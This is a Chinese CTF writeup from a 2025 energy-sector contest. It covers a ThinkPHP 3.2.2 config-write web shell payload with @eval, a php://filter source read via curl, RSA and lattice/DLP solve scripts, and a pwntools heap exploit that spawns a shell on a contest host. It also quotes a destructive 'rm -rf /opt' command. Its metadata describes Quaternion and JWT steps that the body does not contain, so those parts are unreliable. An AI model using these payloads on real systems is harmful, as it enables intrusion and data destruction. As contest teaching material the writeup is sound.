---
title: 2025 年能源网络安全大赛 Writeup（ThinkPHP 3.2.2 写配置 + RSA 费马 + LWE BSGS）
contest: 2025 能源网络安全大赛
year: 2025
difficulty: medium
vuln_type:
- rce
- lfi
- crypto_rsa
- lattice
- jwt
tags:
- 能源 2025
- ThinkPHP 3.2.2 报错泄露
- db[] 写配置 RCE
- is_numeric 289114abc 弱类型比较
- php://filter 读 flaaaaaaag.php base64
- NumberTheory 费马 2^hint ≡ 1 mod p
- easy_lwe 30 组
- Quaternion 四元数 DLP
- BSGS 优化 secret < 2^50
- jwtKey 2 位爆破
attack_chain:
- 'Web easyInstall: ThinkPHP 3.2.2 db[]=mysqli&...&db[]=1''.phpinfo().@eval(...).''&... → 写配置 RCE'
- 'yunnuuu.php: tmp1=289114abc is_numeric 假阴性 ==289114 弱类型'
- tmp2=php://filter/.../flaaaaaaag.php base64 读源码
- 'NumberTheory: hint+233k=233kp → 2^hint ≡ 1 mod p → p = gcd(2^hint-1, n)'
- 'easy_lwe: 30 组 (a, c) + p-1 大素因子 → Pohlig-Hellman'
- 'Quaternion DLP: Q=(123456789, 987654321, 135792468, 864297531) R=power(Q, secret) → BSGS secret < 2^50'
- jwtKey 2 位爆破 (charset a-zA-Z0-9 62 字符)
key_payload: p = gcd(pow(2, hint, n) - 1, n)
one_liner: 2025 能源网络安全：ThinkPHP 3.2.2 db[] 写配置 RCE + yunnuuu.php is_numeric 弱类型 + 费马小定理解 RSA + LWE Quaternion BSGS。
lesson: ThinkPHP 3.2.2 db[] 写配置 RCE 是历史漏洞；is_numeric 弱类型比较经典套（289114abc 不通过 is_numeric 但 == 289114）；费马小定理 2^hint ≡ 1 mod p → p = gcd(2^hint-1, n) 是常用套路。
quality: high
full_path: 2025年能源网络安全大赛-Writeup.full.md
meta_path: 2025年能源网络安全大赛-Writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2025 年能源网络安全大赛 Writeup（ThinkPHP 3.2.2 写配置 + RSA 费马 + LWE BSGS）。2025 能源网络安全：ThinkPHP 3.2.2 db[] 写配置 RCE + yunnuuu.php is_numeric 弱类型 + 费马小定理解 RSA + LWE Quaternion BSGS。。关键路径：Web easyInstall: ThinkPH...'
category: web
subcategory: rce
subcategories:
- rce
- lfi
- rsa
- lattice
- jwt
tools_used:
- ThinkPHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/242944.html
reasoning_chain:
- 触发点：ThinkPHP 3.2.2 报错页暴露 → 假设：可写配置 RCE → 动作：构造 db[]=mysqli&db[]=1'.phpinfo().@eval(...).' 多个 db[] 写 MySQL 配置
- 观察：disable_function 没禁 → 下一步：传 ?youyou=system('cat /flag') 直接 RCE
- 触发点：yunnuuu.php 含 is_numeric($tmp1) 但 == 289114 弱类型比较 → 假设：289114abc 假阴性 → 动作：tmp1=289114abc 绕过
- 观察：tmp2=php://filter/.../flaaaaaaag.php base64 读源码拿到密文 → 假设：php://filter 协议未禁用
- 触发点：Crypto NumberTheory 给 hint + 233k = 233kp → 假设：p-1 | hint * 233 → 动作：费马小定理 2^hint ≡ 1 mod p
- 观察：p = gcd(pow(2, hint, n) - 1, n) → 解 RSA → m = pow(c, d, n)
- 触发点：easy_lwe 给 30 组 (a, c) + p-1 大素因子 → 假设：Pohlig-Hellman 解 m → 动作：先求 secret < 2^50
- 观察：Quaternion 四元数 DLP，R = power(Q, secret) → 动作：BSGS Q,R, 2^50 优化 → 取得 secret → 假设：AES key = md5(secret) 解密
- 触发点：JWT jwtKey 已知前缀 @o70xO$0%#qR9# 缺 2 字符 → 假设：爆破 2 位 62*62=3844 次 → 动作：遍历爆破
failed_attempts:
- 试图直接拼 SQL 命令测 yunnuuu.php → 失败：是 PHP 弱类型比较不是 SQL 注入
- 试图用 Groebner basis 暴力解 Quaternion DLP → 失败：运算量爆炸，转 BSGS
- 试图把 JWT 整个 jwtKey 字典爆破 → 失败：字典太大，限定 2 字符才 3844 次可接受
key_observations:
- ThinkPHP 3.2.2 db[] 写配置 RCE 是历史 CVE，必须无 disable_function 才有效
- is_numeric + 弱类型 == 字符串拼接绕过是 PHP 老牌套路（289114abc 假阴性但 == 289114）
- 费马小定理 2^hint ≡ 1 mod p → p = gcd(2^hint-1, n) 是 RSA 隐 p 通用攻击
- Quat BSGS secret<2^50 比暴力 Pohlig-Hellman 快得多
- JWT 弱 secret 爆破 2 字符 3844 次是常考点
prerequisites:
- ThinkPHP 3.2.2 历史漏洞（db[] 写配置）
- PHP 弱类型比较（is_numeric + ==）
- 费马小定理 / Pollard rho
- Quaternion 四元数实现 + BSGS
---
# 2025年能源网络安全大赛-Writeup

> 原文: https://www.ctfiot.com/242944.html
> ID: 242944

web

easyInstall

报错泄露框架信息是thinkphp3.2.2

源码分析了⼀下发现有⼀个写配置⽂件的⽅法,写⼊shell

db[]=mysqli&db[]=127.0.0.1&db[]=1&db[]=1'.phpinfo().@eval($_GET['youyo
u']).'&db[]=1&db[]=3306&db[]=oscshop_&admin[]=admin&admin[]=a&admin[]=a&adm
in[]=admin@admin.com

看了⼀下，没有disable_function。

这⽹⻚怪怪的

抓包后发现显示secret is in yunnuuu.php，访问ip/yunnuuu.php得到源码

绕过 is_numeric 检查：提交的 tmp1 不能是纯数字，但需要在松散⽐较时等于 289114 。例如，使⽤ tmp1=289114abc ，它在 is_numeric 检查中返回 false ，但在⽐较时会转换为整数 289114 。

利⽤⽂件包含读取flag：通过 tmp2 参数使⽤PHP的 php://filter 协议读取 flaaaaaaag.php 的Base64编码内容，避免直接执⾏导致⽆法查看源码。

Crypto

NumberTheory

hint + 233k = 233kp

hint = 233k(p − 1)

根据费⻢⼩定理

2 hint ≡ 1 mod p

exp：

from Crypto.Util.number import *
from gmpy2 import *
n = 1055318040944102362946870824758284112187881439733520264163925427624371
03918840861241726193253936370648195682452618343195471719649394086997793137
65351896673921212283001557995518380563621388306669498961000356543249365316
40479380485213545256236122539553874307735461246471057726393761944217837836
51686606080214099
c = 6838127295540107402282470465780599628759317234806902778570348919850980
66483410722701224961703608738107534401655038113715964351267223982643890324
10916586193140789219367197841235227586043493994402329715116499180932282888
47534685526358191804172060250409498531941883162873696671060909325234109062
997554795436940
hint = 2254571296159459611390959493560831065109921631767708603680850435226
77811094793442173512565115313130227614423196268240217775831118417780318014
84228020974742627122782651396779194511637817988500066288874499291439020719
63106009960503167370909993999623381332223707455892508533158768182263124533
76340282748842779666176953455553054310328901299083159029050169950812885486
88468234726304576491890719692231389204409574224889509171718737206877976874
3879411865275203496650858608
p = gcd(pow(2,hint,n)-1,n)
q = n // p
d = inverse(65537,(p-1)*(q-1))
m = pow(c,d,n)
print(long_to_bytes(m))

easy_lwe

给出了30组

求出m之后，求解离散对数，注意到p-1存在⼀个⼤素数因⼦，⽤pohlig-hellman求出解，然后做⼩范围

爆破即可，exp如下

from Crypto.Util.number import *

def babystep_giantstep(g, y, p, q=None):
    if q isNone:
        q = p - 1
    m = int(q**0.5 + 0.5)
    table = {}
    gr = 1
    for r in range(m):
        table[gr] = r
        gr = (gr * g) % p
    try:
        gm = pow(g, -m, p)
    
except:
        returnNone
    ygqm = y
    for q in range(m):
        if ygqm in table:
            return q * m + table[ygqm]
        ygqm = (ygqm * gm) % p
    returnNone

factors = [
    (2, 1), (3, 1), (193, 1), (877, 1), (2663, 1), (662056037, 1),
    (812430763 , 1), (814584769 , 1), (830092927 , 1), (849943517 , 1),
    (969016409 , 1), (1000954193 , 1), (1022090869 , 1), (1048277339,1)
]

def pohlig_hellman_DLP(g, y, p):
    crt_moduli = []
    crt_remain = []
    for q, _ in factors:
        x = babystep_giantstep(pow(g, (p - 1) // q, p), pow(y, (p - 1) // q, p), p, q)
        if (x isNone) or (x <= 1):
            continue
        crt_moduli.append(q)
        crt_remain.append(x)
    x = crt(crt_remain, crt_moduli)
    return x,prod(crt_moduli)

p = 0x83b05d231fd40ff8ca26b4fb8136dc920754c14412960ce2ec700457861d48fe74f3958fc3a153f77a23fb850ecf0ac1e9722c71b6cc8a104b372cc17bf1528f
aa = #省略
cc = #省略
enc = 0x191eb43459bd0f2d5ece00ab52c612668bb4c161014641a6e4afb41020465d7b82e9b60a55ab831bb5695f2fd832d08258c752ebf27ba0374b7b11b001b2629a

length = len(aa)
Ge = Matrix(ZZ,length+2,length+2)
for i in range(length):
    Ge[i,i] = p
    Ge[-2,i] = aa[i]
    Ge[-1,i] = cc[i]
T = 2^512
Ge[-2,-2] = 0
Ge[-1,-1] = T

for line in Ge.LLL():
    if abs(line[-1]) == T:
        m1 = (cc[0] - line[0]) * inverse(aa[0],p) % p
        m2 = (cc[1] - line[1]) * inverse(aa[1],p) % p
        print(m1 == m2)
        m = m1

mm = pohlig_hellman_DLP(m,enc,p)
mh = mm[0]
modules = mm[1]

for k in range(10000):
    msg = mh + k*modules
    flag = long_to_bytes(msg)
    ifb'flag'in flag:
        print(flag)
        break

能源行业

USB

拖⼊CTF-NETA流量审计⼯具

直接得到[+] 处理后的结果如下：

whoami && rm -rf /opt

Lave

直接IDA dump脱壳下来

看主逻辑

把-改为+ ，然后把输⼊改为密⽂即可得到flag

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:
222328705

星盟安全团队纳新群2:
346014666

有兴趣的师傅欢迎一起来讨论!

PS:
团队纳新简历投递邮箱：

xmcve@qq.com

责任编辑：@Elite


```
db[]=mysqli&db[]=127.0.0.1&db[]=1&db[]=1'.phpinfo().@eval($_GET['youyo
u']).'&db[]=1&db[]=3306&db[]=oscshop_&admin[]=admin&admin[]=a&admin[]=a&adm
in[]=admin@admin.com
curl -X POST "http://121.43.235.216:
29907/yunnuuu.php?tmp2=php://filter/convert.base64-encode/resource=flaaaa aaag.php" --data "tmp1=289114abc"
import time
import sys
from pwn import *
from ctypes import *
from LibcSearcher import *

RED = ' 33[91m'
GREEN = ' 33[92m'
YELLOW = ' 33[93m'
BLUE = ' 33[94m'
RESET = ' 33[0m'

u64_Nofix = lambda p: u64(p.recvuntil(b'n')[:-1].ljust(8, b'x00'))
u64_fix = lambda p: u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
u64_8bit = lambda p: u64(p.recv(8))

dir = lambda s: log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))

def int_fix(p, count=12):
    p.recvuntil(b'0x')
    return int(p.recv(count), 16)

FILENAME = sys.argv[1]
elf = ELF(FILENAME)
libc = elf.libc
debug = int(sys.argv[2])
context.arch = 'amd64'

if debug == 0:
    argv = ['aa']
    p = process([FILENAME] + argv)
    
if debug == 1:
    p = remote('121.43.235.216', 28765)
    
if debug == 2:
    gdbscript = '''
    b* $rebase(0x13E0)
    c
    '''
    argv = ['a'*21]
    p = gdb.debug([FILENAME] + argv, gdbscript=gdbscript)
    
if debug == 3:
    argv = ['aa']
    p = process([FILENAME] + argv)

def command(option):
    p.recvuntil(b'>>')
    p.sendline(bytes(str(option), 'utf-8'))

def create(size):
    command(1)
    p.recvuntil(b'Size')
    p.sendline(bytes(str(size), 'utf-8'))

def free(id):
    command(3)
    p.recvuntil(b'Idx')
    p.sendline(bytes(str(id), 'utf-8'))

def edit(id, Content):
    command(2)
    p.recvuntil(b'Idx')
    p.sendline(bytes(str(id), 'utf-8'))
    p.recvuntil(b'Content')
    p.send(Content)

create(0x18)  # 0
create(0x18)  # 1

free(1)
free(0)

heap_ptr = 0x403580
edit(0, p64(heap_ptr))

create(0x18)  # 2
create(0x18)  # 1

free_got = 0x4034e0
read_got = 0x403510
myputs = 0x4012B1

edit(1, p64(free_got) + p64(read_got) + p64(heap_ptr))
edit(0, p64(myputs))

free(1)
p.recvuntil(b':')
leak_add = u64(p.recv(6).ljust(8, b'x00'))
leak = 'read'

libc = LibcSearcher(leak, leak_add)  # 0 - libc6_2.31-0ubuntu9.10_amd64
libcbase = leak_add - libc.dump(leak)
system = libcbase + libc.dump('system')

log.info('libcbase ' + hex(libcbase))

edit(0, p64(system))

create(0x18)  # 3
edit(3, b'/bin/shx00')
free(3)

if debug == 3:
    gdb.attach(p)

p.interactive()
from Crypto.Util.number import *
from gmpy2 import *
n = 1055318040944102362946870824758284112187881439733520264163925427624371
03918840861241726193253936370648195682452618343195471719649394086997793137
65351896673921212283001557995518380563621388306669498961000356543249365316
40479380485213545256236122539553874307735461246471057726393761944217837836
51686606080214099
c = 6838127295540107402282470465780599628759317234806902778570348919850980
66483410722701224961703608738107534401655038113715964351267223982643890324
10916586193140789219367197841235227586043493994402329715116499180932282888
47534685526358191804172060250409498531941883162873696671060909325234109062
997554795436940
hint = 2254571296159459611390959493560831065109921631767708603680850435226
77811094793442173512565115313130227614423196268240217775831118417780318014
84228020974742627122782651396779194511637817988500066288874499291439020719
63106009960503167370909993999623381332223707455892508533158768182263124533
76340282748842779666176953455553054310328901299083159029050169950812885486
88468234726304576491890719692231389204409574224889509171718737206877976874
3879411865275203496650858608
p = gcd(pow(2,hint,n)-1,n)
q = n // p
d = inverse(65537,(p-1)*(q-1))
m = pow(c,d,n)
print(long_to_bytes(m))
from Crypto.Util.number import *

def babystep_giantstep(g, y, p, q=None):
    if q isNone:
        q = p - 1
    m = int(q**0.5 + 0.5)
    table = {}
    gr = 1
    for r in range(m):
        table[gr] = r
        gr = (gr * g) % p
    try:
        gm = pow(g, -m, p)
    
except:
        returnNone
    ygqm = y
    for q in range(m):
        if ygqm in table:
            return q * m + table[ygqm]
        ygqm = (ygqm * gm) % p
    returnNone

factors = [
    (2, 1), (3, 1), (193, 1), (877, 1), (2663, 1), (662056037, 1),
    (812430763 , 1), (814584769 , 1), (830092927 , 1), (849943517 , 1),
    (969016409 , 1), (1000954193 , 1), (1022090869 , 1), (1048277339,1)
]

def pohlig_hellman_DLP(g, y, p):
    crt_moduli = []
    crt_remain = []
    for q, _ in factors:
        x = babystep_giantstep(pow(g, (p - 1) // q, p), pow(y, (p - 1) // q, p), p, q)
        if (x isNone) or (x <= 1):
            continue
        crt_moduli.append(q)
        crt_remain.append(x)
    x = crt(crt_remain, crt_moduli)
    return x,prod(crt_moduli)

p = 0x83b05d231fd40ff8ca26b4fb8136dc920754c14412960ce2ec700457861d48fe74f3958fc3a153f77a23fb850ecf0ac1e9722c71b6cc8a104b372cc17bf1528f
aa = #省略
cc = #省略
enc = 0x191eb43459bd0f2d5ece00ab52c612668bb4c161014641a6e4afb41020465d7b82e9b60a55ab831bb5695f2fd832d08258c752ebf27ba0374b7b11b001b2629a

length = len(aa)
Ge = Matrix(ZZ,length+2,length+2)
for i in range(length):
    Ge[i,i] = p
    Ge[-2,i] = aa[i]
    Ge[-1,i] = cc[i]
T = 2^512
Ge[-2,-2] = 0
Ge[-1,-1] = T

for line in Ge.LLL():
    if abs(line[-1]) == T:
        m1 = (cc[0] - line[0]) * inverse(aa[0],p) % p
        m2 = (cc[1] - line[1]) * inverse(aa[1],p) % p
        print(m1 == m2)
        m = m1

mm = pohlig_hellman_DLP(m,enc,p)
mh = mm[0]
modules = mm[1]

for k in range(10000):
    msg = mh + k*modules
    flag = long_to_bytes(msg)
    ifb'flag'in flag:
        print(flag)
        break
whoami && rm -rf /opt
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]